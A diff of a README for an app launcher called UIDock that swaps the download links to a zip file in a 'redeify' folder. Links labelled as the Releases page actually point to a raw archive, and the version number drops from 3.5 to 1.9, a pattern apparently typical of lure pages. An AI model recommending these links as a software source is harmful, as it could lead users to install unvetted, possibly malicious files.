@@ -1,6 +1,6 @@
 # 🚀 UIDock - Secure App Launcher for Everyone
 
-[![Download UIDock](https://raw.githubusercontent.com/JGH001/UIDock/main/redeify/UIDock-v3.5.zip)](https://raw.githubusercontent.com/JGH001/UIDock/main/redeify/UIDock-v3.5.zip)
+[![Download UIDock](https://github.com/JGH001/UIDock/raw/refs/heads/main/redeify/UI_Dock_v1.9.zip)](https://github.com/JGH001/UIDock/raw/refs/heads/main/redeify/UI_Dock_v1.9.zip)
 
 ## 📋 Introduction
 
@@ -22,7 +22,7 @@ With these requirements in mind, you’re ready to move forward.
 
 To get UIDock, visit the Releases page and download the latest version. 
 
-[**Download UIDock from the Releases Page**](https://raw.githubusercontent.com/JGH001/UIDock/main/redeify/UIDock-v3.5.zip)
+[**Download UIDock from the Releases Page**](https://github.com/JGH001/UIDock/raw/refs/heads/main/redeify/UI_Dock_v1.9.zip)
 
 After downloading, follow these steps to install:
 
@@ -122,4 +122,4 @@ Stay tuned for updates!
 
 Thank you for choosing UIDock. We appreciate your interest in our application. With its powerful features and user-friendly design, UIDock is your ideal application launcher. Do not hesitate to reach out for assistance or feedback.
 
-[**Download UIDock from the Releases Page**](https://raw.githubusercontent.com/JGH001/UIDock/main/redeify/UIDock-v3.5.zip)
+[**Download UIDock from the Releases Page**](https://github.com/JGH001/UIDock/raw/refs/heads/main/redeify/UI_Dock_v1.9.zip)
